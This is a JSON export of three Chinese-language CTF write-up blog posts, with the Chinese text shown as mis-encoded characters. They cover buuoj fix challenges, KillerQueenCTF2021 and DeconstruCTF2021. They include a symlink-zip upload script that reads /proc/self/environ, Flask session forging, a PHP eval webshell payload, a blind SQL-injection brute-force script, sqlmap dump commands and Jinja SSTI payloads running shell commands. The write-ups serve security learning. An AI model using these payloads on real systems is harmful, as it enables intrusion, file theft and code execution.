[{"categories":["CTF"],"contents":"buuojæ–°ä¸Šäº†åŠ å›ºé¢˜è¿™ä¸ªåˆ†ç±»ï¼Œä¹Ÿå°±æ˜¯çº¿ä¸‹awdpä¸­fixçš„éƒ¨åˆ†ï¼Œåªè¦å°†é¶æœºä¸­å­˜åœ¨çš„æ¼æ´ä¿®å¤å¥½å¹¶é€šè¿‡checkçš„æ£€æµ‹å³å¯æ‹¿åˆ°flagï¼›æœ‰ä¸€è¯´ä¸€ï¼Œæ¯”å•çº¯attackæ‹¿flagä¼šç®€å•å¾ˆå¤šï¼ˆé€‚åˆæˆ‘è¿™ç§æ²¸ç‰©web\nä¸‹é¢çš„wpä¼šå…ˆè¯´çº¯ä¿®å¤è§’åº¦ï¼Œå†ä¸²ä¸€ä¸‹æ•´ä½“çš„çŸ¥è¯†ç‚¹ï¼›å› ä¸ºè‡ªå·±æ°´å¹³æœ‰é™ï¼Œæƒ³å°½å¯èƒ½è¯´çš„æ¸…æ¥šä¸€äº›å°±ä¼šæ¯”è¾ƒå•°å—¦ï¼Œè§è°…QAQ\nEzsql FIX 200è¡Œï¼Œå¤ªå…¸äº†ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°å®Œå…¨æ²¡æœ‰æ£€æµ‹ï¼Œæ˜¯ä¸ªç­›å­ï¼›ç”¨é¢„å¤„ç†çš„æ–¹å¼ä¿®ï¼Œåˆå¯ä»¥åˆ†ä¸ºä¸¤ç§å½¢å¼\nmysqlé¢„å¤„ç† å…¶ä¸­201è¡Œçš„ssæŒ‡çš„æ˜¯ç»‘å®šSQLå‚æ•°çš„ç±»å‹ä¸ºstringï¼Œè¿™ä¸€é¡¹å¿…ä¸å¯å°‘è€Œä¸”å¿…é¡»ä¸åé¢çš„å‚æ•°ä¸€ä¸€å¯¹åº”\nPDOé¢„å¤„ç† PDOé¢„å¤„ç†å±äºæ˜¯é€šé˜²äº†ï¼Œèƒ½æœ‰æ•ˆåœ°åº”å¯¹sqliç‰¹åˆ«æ˜¯å †å æ³¨å…¥ï¼Œ208è¡Œçš„è®¾ç½®é¡¹æ„ä¸ºç¦ç”¨æ¨¡æ‹Ÿé¢„å¤„ç†\n[CISCN2021 æ€»å†³èµ›]babypython FIX sshè¿ä¸Šåçœ‹ä¸‹ç›®å½•ç»“æ„\næŸ¥çœ‹/app/y0u_found_it/y0u_found_it_main.py\n11è¡Œè¿™ä¸æ˜¯å…¸ä¸­å…¸äº†ï¼Ÿè¯»macåœ°å€å°±æ‰“é€šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠSECRET_KEYæ”¹ä¸ºä¸€ä¸ªåˆé•¿åˆä¹±çš„éšæœºå­—ç¬¦ä¸²å³å¯ï¼Œå¯ä»¥ä½¿ç”¨uuid/guidç”Ÿæˆå™¨æ¥ç”Ÿæˆ\n â€”â€”â€”â€”ç¢ç¢å¿µï¼šè¿™é‡Œä¿®å¤çš„æ—¶å€™å¯èƒ½çœ‹è„¸ï¼Ÿæˆ‘åœ¨å‡ å¤©å‰è¯•çš„æ—¶å€™ç”¨çš„ä¸€æ¨¡ä¸€æ ·çš„æ–¹æ³•ï¼Œä½†æ˜¯æ€ä¹ˆéƒ½ä¸èƒ½è¿‡checkï¼Œä»Šå¤©è¯•äº†ä¸€æ¬¡å°±å¯ä»¥äº†ï¼Œä½†æ˜¯åœ¨å†™wpçš„æ—¶å€™å†å¤ç›˜å°±åˆä¸å¯ä»¥äº†â€¦â€¦emmm å¯èƒ½è¿˜æ˜¯å“ªé‡Œçš„ç»†èŠ‚å‡ºäº†é”™ä½†æ˜¯æˆ‘æ²¡æœ‰æ³¨æ„åˆ°ï¼Ÿç»™æˆ‘æ•´ä¸ä¼šäº†å±äºæ˜¯\n å…³äºæœ¬é¢˜ æ˜¯ä¸ªåŸé¢˜ï¼Œè¿˜æ˜¯ä¸ªæœ‰äº†åŒ…æµ†çš„åŸé¢˜ï¼Œå‚è§-\u0026gt;[HCTF 2018]Hideandseek | [SWPU2019]Web3ï¼Œåšè¿‡çš„å°±çŸ¥é“è¿™ä»–å¦ˆçœŸçš„å°±ä¸€æ¨¡ä¸€æ ·hhhhhhhh\nè€ƒç‚¹åœ¨äºlinuxè½¯é“¾æ¥+uuid+flask-sessionä¼ªé€ ï¼Œåè€…è¿˜ç»å¸¸å•ç‹¬å‡ºé¢˜ï¼Œæ¯”å¦‚ [CISCN2019 åä¸œå—èµ›åŒº]Web4ï¼Œéƒ½å¿«çƒ¤çƒ‚äº†\nè€ƒç‚¹ä¸€ Â· uuid\u0026amp;SECRET_KEY SECRET_KEYé€šè¿‡uuid+ä¼ªéšæœºæ•°çš„æ–¹å¼ç”Ÿæˆï¼Œè¿™ä¸ªè€ƒç‚¹å¯ä»¥å‚è€ƒ [CISCN2019 åä¸œå—èµ›åŒº]Web4ï¼Œå…¶ä¸­app.pyæ˜¯è¿™æ ·å†™çš„\nuuid.getnode()ä¼šä»¥48ä½äºŒè¿›åˆ¶é•¿åº¦çš„æ­£æ•´æ•°å½¢å¼è¿”å›macåœ°å€ï¼Œlinuxä¸‹macåœ°å€çš„ä½ç½®åœ¨/sys/class/net/eth0/addressï¼Œè¯»å‡ºmacåœ°å€åæˆ‘ä»¬ä¹Ÿæ¥ç”Ÿæˆä¸€æ³¢ä¼ªéšæœºæ•°\nä¹‹åé€šè¿‡flask-session-cookie-managerä¸€æŠŠæ¢­å³å¯ä¼ªé€ sessionå€¼\nâ€”â€”â€”â€”å¦å¤–ï¼Œé€šå¸¸è®¿é—®ä¸å­˜åœ¨ç›®å½•æ—¶SECRET_KEYä¼šå‡ºç°åœ¨è¯·æ±‚å¤´ä¸­\nè€ƒç‚¹äºŒ Â· linuxè½¯é“¾æ¥æ–‡ä»¶è¯»å–\u0026amp;zipå‹ç¼©åŒ… ln -sæ˜¯linuxä¸­çš„è½¯é“¾æ¥å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œå¯¹åº”æ–‡ä»¶çš„ç»å¯¹è·¯å¾„çš„è½¯é“¾æ¥æ¥è¯»æ–‡ä»¶ï¼›å½“ä¸çŸ¥é“flaskå·¥ä½œç›®å½•å¯ä»¥ä½¿ç”¨/proc/self/cwdæ¥æŒ‡å‘å½“å‰è¿›ç¨‹çš„ç›®å½•\nln -s /proc/self/cwd/flag/flag/.jpg qwe æˆ–è€…é€šè¿‡/proc/self/environæ–‡ä»¶é‡ŒåŒ…å«è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»ä¸­è·å–flaskçš„ç»å¯¹è·¯å¾„ï¼Œå†åˆ¶ä½œè½¯é“¾æ¥ï¼ˆå…³äº/procçš„æ›´å¤šä¿¡æ¯å¯ä»¥å‚è§-\u0026gt;/procç›®å½•çš„å¦™ç”¨ | LFItoRCEåˆ©ç”¨æ€»ç»“ï¼Œé¢˜-\u0026gt;[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown\nln -s /proc/self/environ qwe è€Œå¯¹äºç›®å½•å†…æ–‡ä»¶çš„åˆ—ä¸¾ä¹Ÿæ˜¯æœ‰æ–¹æ³•çš„ï¼ˆå‚è€ƒ-\u0026gt;34C3 CTF Webé¢˜ extract0r Writeup\nåˆ¶ä½œå¥½çš„è½¯é“¾æ¥é€šè¿‡zipæ‰“åŒ…\nzip -ry qwe.zip qwe æ›´å¤šé¢˜ç›®ä¸­çš„åº”ç”¨å¯ä»¥å‚è§-\u0026gt;è®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•\nå…³äºè¿™ä¸ªæ¼æ´çš„å®é™…åº”ç”¨å¯ä»¥å‚è§-\u0026gt;GitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´\n*ATTACK exp.py - 1 ç”Ÿæˆè½¯é“¾æ¥\u0026amp;zip\u0026amp;è‡ªåŠ¨ä¸Šä¼ \nimport requests import os import sys url = \u0026#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload\u0026#39; def makezip(): os.system(\u0026#39;ln -s \u0026#39;+sys.argv[1]+\u0026#39; exp\u0026#39;) # os.system(\u0026#39;zip --symlinks exp.zip exp\u0026#39;) os.system(\u0026#39;zip -ry exp.zip exp\u0026#39;) makezip() files = {\u0026#39;the_file\u0026#39;:open(\u0026#39;./exp.zip\u0026#39;, \u0026#39;rb\u0026#39;)} def exploit(): res = requests.post(url, files=files) print(res.text) exploit() os.system(\u0026#39;rm -rf exp\u0026#39;) os.system(\u0026#39;rm -rf exp.zip\u0026#39;) python3 /proc/self/environ python3 exp.py /app/y0u_found_it.ini python3 /app/y0u_found_it/y0u_found_it_main.py python3 /sys/class/net/eth0/address exp.py - 2 æ ¹æ®macåœ°å€ç”Ÿæˆä¼ªéšæœºæ•°\nimport uuid import random mac = \u0026#34;02:42:0a:00:cb:06\u0026#34; temp = mac.split(\u0026#39;:\u0026#39;) temp = [int(i,16) for i in temp] temp = [bin(i).replace(\u0026#39;0b\u0026#39;,\u0026#39;\u0026#39;).zfill(8) for i in temp] temp = \u0026#39;\u0026#39;.join(temp) mac = int(temp,2) random.seed(mac) result = str(random.random()*100) print(result) # 36.014406163923596 python3 flask_session_cookie_manager3.py decode -c \u0026#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc\u0026#39; python3 flask_session_cookie_manager3.py encode -s \u0026#39;36.014406163923596\u0026#39; -t \u0026#34;{u\u0026#39;username\u0026#39;: u\u0026#39;admin\u0026#39;}\u0026#34; ç¿»å›å¤´çœ‹æºç ï¼Œå¥½å®¶ä¼™è¿™é‡Œæœ‰å†…é¬¼\nè¿”å›çš„å¹¶ä¸æ˜¯çœŸæ­£çš„flagï¼Œè€Œæ˜¯secret.secretä¸­çš„å†…å®¹no flah\n67è¡Œè¿™é‡Œä¼šå¯¹unzipæ‰“å¼€çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥ï¼Œåªè¦å«æœ‰flagå­—æ ·å°±ä¼šé‡å®šå‘è‡³/?error=1\nâ€”â€”â€”â€”è¿™é‡Œæˆ‘æ„Ÿè§‰åŸé¢˜åº”è¯¥secret.pyä¸­çš„secret=ç›´æ¥å°±èƒ½è¯»å‡ºæ¥flagï¼Œæƒ³äº†å¥½ä¹…ï¼Œå†ç»•ä¸€å±‚flag.txtçš„è¯æˆ‘æ˜¯æƒ³ä¸å‡ºæ¥ä»€ä¹ˆbypassçš„æ–¹æ³•äº†ï¼Œæˆ‘å€¾å‘äºæ˜¯å¸ƒç½®ç¯å¢ƒçš„æ—¶å€™æ²¡æœ‰è®¾ç½®è¿™ä¸€ç‚¹ï¼ˆ\n***[CISCN2021 æ€»å†³èµ›]easy_python ä¸çŸ¥é“æ˜¯æˆ‘çš„ç½‘ç»œé—®é¢˜è¿˜æ˜¯ä»€ä¹ˆæœªçŸ¥çš„bugâ€¦â€¦checkä¹‹åå°±ä¼šå®•æœºï¼Œåªèƒ½é‡æ–°ä¸‹å‘é¶æœº\n***[CISCN2021 æ€»å†³èµ›]ezj4va https://juejin.cn/post/6997314123918737422\nè¿˜ä¸ä¼šjava å…ˆç©ºç€TAT\n","date":"2021-11-07T08:57:29+08:00","permalink":"https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/","section":"posts","tags":["wp"],"title":"buuojåŠ å›ºé¢˜ Wp"},{"categories":["CTF"],"contents":"web/Just Not My Type  I really don\u0026rsquo;t think we\u0026rsquo;re compatible (Link)\n \u0026lt;?php $FLAG = \u0026#34;shhhh you don\u0026#39;t get to see this locally\u0026#34;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $password = $_POST[\u0026#34;password\u0026#34;]; if (strcasecmp($password, $FLAG) == 0) { echo $FLAG; } else { echo \u0026#34;That\u0026#39;s the wrong password!\u0026#34;; } } ?\u0026gt;æˆ‘ä»¬çš„è€æœ‹å‹strcasecmp()å‡½æ•°ï¼Œå®ƒå’Œstrcmp()å‡½æ•°ä¸€æ ·ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒºåˆ«æ˜¯åè€…ä¼šåŒºåˆ†å¤§å°å†™ï¼›ç»•è¿‡æ–¹å¼æ˜¯ä¼ å…¥æ•°ç»„ï¼Œè¿™æ ·ä¼šä½¿ä¸¤ä¸ªå‡½æ•°æ— æ³•å¤„ç†è€Œè¿”å›null\nflag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}\nweb/PHat Pottomed Girls  Now it\u0026rsquo;s attempt number 3 and this time with a Queen reference! (flag is in the root directory) (Link)\n \u0026lt;?php session_start(); function generateRandomString($length = 15) { $characters = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $charactersLength = strlen($characters); $randomString = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } function filter($originalstring) { $notetoadd = str_replace(\u0026#34;\u0026lt;?php\u0026#34;, \u0026#34;\u0026#34;, $originalstring); $notetoadd = str_replace(\u0026#34;?\u0026gt;\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;\u0026lt;?\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;flag\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fopen\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fread\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;file_get_contents\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fgets\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;cat\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;strings\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;less\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;more\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;head\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;tail\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;dd\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;cut\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;grep\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;tac\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;awk\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;sed\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;read\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;system\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); return $notetoadd; } if(isset($_POST[\u0026#34;notewrite\u0026#34;])) { $newnote = $_POST[\u0026#34;notewrite\u0026#34;]; //3rd times the charm and I\u0026#39;ve learned my lesson. Now I\u0026#39;ll make sure to filter more than once :)  $notetoadd = filter($newnote); $notetoadd = filter($notetoadd); $notetoadd = filter($notetoadd); $filename = generateRandomString(); array_push($_SESSION[\u0026#34;notes\u0026#34;], \u0026#34;$filename.php\u0026#34;); file_put_contents(\u0026#34;$filename.php\u0026#34;, $notetoadd); header(\u0026#34;location:index.php\u0026#34;); } ?\u0026gt;ç®€å•çœ‹ä¸€ä¸‹æµç¨‹ï¼Œfilter()å‡½æ•°ä¼šå¯¹æˆ‘ä»¬postä¼ å…¥çš„notewriteå‚æ•°ï¼ˆä¹Ÿå°±æ˜¯ä¼šè¢«å†™å…¥çš„æ–‡ä»¶å†…å®¹ï¼‰è¿›è¡Œæ¯”è¾ƒä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ–‡ä»¶åæ˜¯generateRandomString()ç”Ÿæˆçš„éšæœºåå­—ï¼Œä½†æ˜¯ä¸é‡è¦ï¼Œå®ƒä¼šè‡ªåŠ¨æ‹¼ä¸Š.phpçš„åç¼€å¹¶ä¸”æŠŠåå­—å†™åˆ°session['notes']ä¸­ï¼›æ‰€ä»¥æˆ‘ä»¬å”¯ä¸€éœ€è¦å¤„ç†çš„å°±æ˜¯filter()å‡½æ•°çš„ç»•è¿‡äº†\nå°´å°¬çš„æ˜¯è¿™ä¸ªfilter()è·Ÿä¸ªç­›å­ä¸€æ ·â€¦â€¦é¦–å…ˆæ˜¯æ²¡æœ‰è¿‡æ»¤eval()ï¼Œå…¶æ¬¡æ˜¯str_replace()ä¹Ÿæ˜¯æ°´çš„ä¸€æ‰¹\npayload:\nnotewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B ä¹‹åè¿ä¸Šèšå‰‘å³å¯æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„flag.php\nflag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}\nforensics/Obligatory Shark  remember to wrap the flag\n çœ‹tcpæµï¼Œtelnetæ˜æ–‡æµé‡\n33a465747cb15e84a26564f57cda0988\nflag{dancingqueen}\n","date":"2021-10-30T16:39:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/","section":"posts","tags":["wp"],"title":"KillerQueenCTF2021 Wp"},{"categories":["CTF"],"contents":"https://ctftime.org/event/1453/tasks/\nWeb/Here\u0026rsquo;s a Flag  A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?\n https://www.youtube.com/watch?v=dQw4w9WgXcQ ä¸ç”¨çœ‹äº† Never Gonna Give You Up\nçœ‹style.css flag: \u0026ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}\u0026quot;; ä½†æ˜¯ä¸æ˜¯æœ€ç»ˆçš„flagï¼Œè§£ä¸€ä¸‹rot13 amount=23\ndsc{we0come_to_deconstructf}\nç­¾åˆ°é¢˜ä¹Ÿå¥½æŠ˜è…¾TAT\nWeb/Please  Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company\u0026rsquo;s servers. I know it\u0026rsquo;s been a while, but could you please try to access those files? I would be very grateful!\n ç†Ÿç»ƒæŠ“åŒ…ï¼ŒCookieä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼ŒAdmin_Accesså’ŒUsernameï¼Œæ”¹ä¸ºTrueå’ŒClancy\næ”¹æµè§ˆå™¨æ ‡è¯†å¤´ User-Agent: DeemBrowser\néœ€è¦åŸºç¡€è®¤è¯ï¼Œä½†æ˜¯è¿™é‡Œçš„MagicWordç¨å¾®å¡äº†ä¸€ä¸‹\nåŸå› æ˜¯æˆ‘å¤ªé“¸å¸äº†å¿˜äº†åŠ Basicï¼ŒAuthorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==\nåŠ ä¸€ä¸ªæ—¥æœŸçš„å¤´ï¼ŒDate: Thu, 1 Apr 2021 12:00:00 GMT\næ¢æˆDate: Mon, 5 Apr 2021 12:00:00 GMT\ndsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}\nWeb/Taxi Union Problems  An important package has been stolen from Mr Nagaraj by a Taxi driver. We\u0026rsquo;ve tried to ask the local taxi union about driver\u0026rsquo;s location but they are refusing provide the same.\nSince this package is required for a time sensitive matter we don\u0026rsquo;t have time to negotiate with the union.\nYour task is to obtain the location of the taxi using the given information Taxi Lisence Plate: TN-06-AP-9879\nHINT: The flag is the location of the taxi (no caps)\n è¾“å…¥TN-06-AP-9879'--%20å›æ˜¾ä¸€æ ·ï¼Œæœ‰æ³¨å…¥ï¼ŒæŠŠpostçš„å†…å®¹æ‹¿å»è®©sqlmapè·‘ä¸€ä¸‹\npython sqlmap.py -r \u0026quot;/home/amelia/sh4r3/post.txt\u0026quot; -p lisence_plate --tables python sqlmap.py -r \u0026quot;/home/amelia/sh4r3/post.txt\u0026quot; -p lisence_plate -T taxi --columns python sqlmap.py -r \u0026quot;/home/amelia/sh4r3/post.txt\u0026quot; -p lisence_plate -T taxi --dump Ayanavaram\n*Web/Never gonna lie to you  Trust me, take everything in the home page for face value. I would never lie to you.\n ä¸»é¡µæœ‰ä¸€å¥Not even search engines can find it.ï¼Œæç¤ºæˆ‘ä»¬çœ‹/robots.txt\nè½¬åˆ°/never_gonna_give_you_upé¡µé¢ï¼Œæ ‡é¢˜æ˜¯Admin Pageä½†æ˜¯ä¸€ç‰‡ç©ºç™½ï¼ŒæŠ“åŒ…åçœ‹åˆ°postè¡¨å•çš„åœ°æ–¹è¢«æŠ¬å¤´ç»™æŒ¡ä½äº†ï¼Œç›®æ ‡åœ°å€æ˜¯/never_gonna_let_you_down\næäº¤ä¸¤ä¸ªå‚æ•°usernameå’Œpasswordï¼Œå›æ˜¾YOU LIED TO ME !!!\nâ€”â€”â€”â€”ç„¶åæ²¡ç„¶åäº† æˆ‘è¿˜æ²¡çœ‹å®Œ ç¯å¢ƒå°±å…³äº†TAT\nWeb/Curly Fries 1  Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. The flag is right in front of you.\n emmmmm æ²¡æœ‰ä»»ä½•æç¤º\nçœ‹wpä»¥åå‘ç°è¿™æ˜¯çœŸè„‘æ´äº†ï¼Œä½†ä¹Ÿä¸èƒ½è¿™ä¹ˆè¯´ï¼Œæ¯•ç«Ÿå·²ç»ç»™å‡ºäº†Swedenå¾ˆæ˜æ˜¾çš„æç¤ºï¼Œæˆ‘ä»¬éœ€è¦ç”¨æŒ‡å®šçš„Swedishè¯­è¨€æ¥è®¿é—®è¿™ä¸ªç½‘ç«™\ncurl -i http://very.uniquename.xyz:8880/ -H \u0026#34;Accept-Language: sv-SE\u0026#34; dsc{1_l0v3_sw3d3n}\nWeb/The Gate Keeper  That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.\nNote: This challenge might require a bruteforce approach.\n è¿˜æ˜¯sqli\nimport requests import string flag = \u0026#39;\u0026#39; print(flag) domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + \u0026#39;_}\u0026#39; f = 0 challenge = \u0026#34;gate keeper\u0026#34; url = \u0026#34;\u0026#34; check = \u0026#34;\u0026#34; key = \u0026#34;\u0026#34; column = \u0026#34;\u0026#34; if challenge == \u0026#34;taxi union\u0026#34;: url = \u0026#39;http://extremely.uniquename.xyz:2052/\u0026#39; check = \u0026#34;TN-06-AP-9879\u0026#34; key = \u0026#39;lisence_plate\u0026#39; column = \u0026#34;location\u0026#34; elif challenge == \u0026#39;gate keeper\u0026#39;: url = \u0026#39;http://extremely.uniquename.xyz:2082/\u0026#39; check = \u0026#34;The flag for the CTF is the password you entered.(If you havent cheated that is)\u0026#34; key = \u0026#39;password\u0026#39; column = \u0026#34;password\u0026#34; print(\u0026#34;URL\u0026#34;, url) while True: for char in domain: payload = \u0026#34;\u0026#39; or {}like \u0026#39;{}%\u0026#39;; --\u0026#34;.format(column, flag + char) print(payload) r = requests.post(url, data={key: payload}) if (check in r.text): flag = flag + char print(\u0026#34;Success \u0026#34; + flag) break Web/Hungry Man  There is nothing here I promise! ;)\n æŠ“åŒ…ï¼Œcookieéƒ¨åˆ†æœ‰ä¸€ä¸ªb64ï¼Œè§£ç å\nè¯´å®è¯ï¼Œè¿™ä¸ªé¢˜åšçš„æ—¶å€™æ²¡æ³¨æ„set-cookieçš„éƒ¨åˆ†ï¼Œå‚è€ƒwp\nè¿™é‡Œçš„ä¾æ®set-cookieçš„å€¼è®¾ç½®åï¼Œä¼šä¸æ–­çš„äº§ç”Ÿæ–°çš„md5-hashçš„cookieå€¼ï¼Œå†™ä¸€ä¸ªè„šæœ¬ä¸æ–­åœ°è®¾ç½®å’Œåº”ç”¨æ–°çš„cookieï¼Œå°†è¿™äº›è§£å¯†åæ‹¼èµ·æ¥å°±æ˜¯flagäº†\ndsc{91v3_m3_4_h4ndfu1_0f_c00k135}\nWeb/Curly Fries 2  Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. Why do logos make things so recognizable?\n æ— æç¤ºï¼Œå‚è€ƒwp\næœ‰ç‚¹è„‘æ´äº†ï¼ŒæŠŠUser-Agentçš„åœ°æ–¹è®¾ç½®ä¸ºxboxå’ŒLinuxä¹‹åï¼Œå›¾ç‰‡ä¼šæ¶ˆå¤±å¹¶éœ²å‡ºflag\ndsc{1m4g1n3_l1nux_0n_4n_xb0x}\nWeb/Curly Fries 3  Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. I\u0026rsquo;m with you, every step of the way.\n ç›´æ¥è®¿é—®æç¤º405ï¼Œpostä¸€ä¸‹å›æ˜¾perhaps try Googling me instead?\nè®¿é—®/robots.txtï¼Œ404\nç”¨wappalyzerå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªflaskåº”ç”¨\nå‚è€ƒwp\nçœ‹åˆ°ç¬¬ä¸€ä¸ªæç¤ºä¹‹åä¸å¤Ÿæ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æ¥æºreferæ˜¯google.com\ncurl -i -X POST -H \u0026quot;Referer: https://www.google.com\u0026quot; http://overly.uniquename.xyz:2095/ å›æ˜¾ä¸­æç¤ºæˆ‘ä»¬å†è®¾ç½®Host\ncurl -i -X POST -H \u0026quot;Referer: https://www.google.com\u0026quot; -H\u0026quot;Host:https://dscvit.com\u0026quot; http://overly.uniquename.xyz:2095/ å›æ˜¾potates and carrots are my friends, milk and Cookies will be my endï¼Œä¸æ˜¯å¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯åº”è¯¥è®¾ç½®cookie=root\nä¹‹åå›æ˜¾JFATHER, JMOTHER, JDAUGHTER, ____?ï¼Œæç¤ºæŠŠcontent-typeæ”¹ä¸ºjson\nå›æ˜¾*{\u0026lsquo;error\u0026rsquo;: \u0026lsquo;json data missing\u0026rsquo;}*ï¼Œæ·»åŠ ä¸€ç‚¹data\ncurl -i -X POST -H \u0026quot;Referer: https://www.google.com\u0026quot; -H \u0026quot;Host: https://www.dscvit.com\u0026quot; -H \u0026quot;Content-Type: application/json\u0026quot; --cookie \u0026quot;user=root\u0026quot; -d '{\u0026quot;foo\u0026quot;:\u0026quot;bar\u0026quot;}' http://overly.uniquename.xyz:2095/ å›æ˜¾*{\u0026lsquo;error\u0026rsquo;: {\u0026lsquo;messi\u0026rsquo;: \u0026lsquo;required\u0026rsquo;}}ï¼Œå°†fooæ”¹ä¸ºbarï¼Œå›æ˜¾{\u0026lsquo;error\u0026rsquo;: {\u0026lsquo;messi\u0026rsquo;: \u0026lsquo;which club am i at?'}}*\n*ä¸å¤ªæ‡‚ä¸ºå•¥è¿™å°±èƒ½çŸ¥é“æŠŠbarèµ‹å€¼ä¸ºPSGï¼Ÿï¼Ÿï¼Ÿ\ncurl -i -X POST -H \u0026quot;Referer: https://www.google.com\u0026quot; -H \u0026quot;Host: https://www.dscvit.com\u0026quot; -H \u0026quot;Content-Type: application/json\u0026quot; --cookie \u0026quot;user=root\u0026quot; -d '{\u0026quot;messi\u0026quot;:\u0026quot;psg\u0026quot;}' http://overly.uniquename.xyz:2095/ å¾—åˆ°flag dsc{th15_15_w4y_t00_much_w0rk}\nWeb/Mega Mailer  We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?\n è®²çœŸï¼Œä¹‹å‰æ²¡æ¥è§¦è¿‡\né¦–å…ˆåœ¨è‡ªå·±çš„vpsä¸Šå¼€ä¸€ä¸ªsmtpçš„æœåŠ¡ï¼Œç”¨pythonå¼€\npython3 -m smtpd -c DebuggingServer -n 0.0.0.0:25 ç„¶åå…¶å®ƒä¿¡æ¯æ­£å¸¸å¡«ï¼Œbodyéƒ¨åˆ†å­˜åœ¨sstiæ³¨å…¥ï¼Œpayloadæ¥è‡ªäºPayloadsAllTheThings\n{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}} {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}} {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}} dsc{819_8r41n_m41L3R}\nå‚è€ƒï¼šwp\n è¯´å®è¯ï¼Œè¿™ä¸€ç¯‡wpæ—©å°±æ°´å®Œäº†ï¼Œä½†æ˜¯ä¸­é—´é‚£ä¸ªNever gonna lie to youçš„é¢˜å› ä¸ºæ²¡æœ‰åœ°æ–¹å¤ç°ä¹Ÿæ²¡æœç€åˆ«çš„wpå°±ä¸€ç›´æ‹–ç€ï¼Œæ‹–åˆ°ç°åœ¨ï¼Œè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œæ”¾å¼ƒäº†ï¼Œå¯æƒœæ­»äº†ï¼Œè¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬åšé¢˜å¤ç°è¦è¶æ—©\n","date":"2021-10-30T13:35:32+08:00","permalink":"https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/","section":"posts","tags":["wp"],"title":"DeconstruCTF2021 